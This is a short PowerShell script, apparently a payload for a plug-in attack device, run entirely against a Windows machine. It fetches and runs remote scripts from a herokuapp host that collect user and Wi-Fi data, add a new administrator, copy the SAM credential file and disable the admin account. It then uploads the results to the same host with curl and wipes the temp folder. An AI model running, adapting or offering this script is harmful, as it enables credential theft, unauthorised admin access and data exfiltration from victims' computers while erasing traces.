Invoke-RestMethod -Method Get -Uri "https://gabup.herokuapp.com/script/scripts" -OutFile $env:temp\ebcb78ac-7b55-45ca-beb2-947b3439e9ce.zip;

Expand-Archive -LiteralPath $env:temp\ebcb78ac-7b55-45ca-beb2-947b3439e9ce.zip -DestinationPath $env:temp\ebcb78ac-7b55-45ca-beb2-947b3439e9ce

. $env:temp\ebcb78ac-7b55-45ca-beb2-947b3439e9ce\1usersAndWlans.ps1
. $env:temp\ebcb78ac-7b55-45ca-beb2-947b3439e9ce\2NewAdmin.ps1
. $env:temp\ebcb78ac-7b55-45ca-beb2-947b3439e9ce\3cSAMFile.ps1
. $env:temp\ebcb78ac-7b55-45ca-beb2-947b3439e9ce\4disableAdminAccount.ps1

Compress-Archive -Path $env:temp\f3a4def0-1632-4d84-a99b-7c69233a91b8\* -DestinationPath $env:temp\f3a4def0-1632-4d84-a99b-7c69233a91b8.zip 

curl.exe --request POST --url https://gabup.herokuapp.com/upload --header 'Content-Type: multipart/form-data' --form file="@$env:temp\f3a4def0-1632-4d84-a99b-7c69233a91b8.zip"

Remove-Item $env:temp\* -Recurse -Force -ErrorAction SilentlyContinue
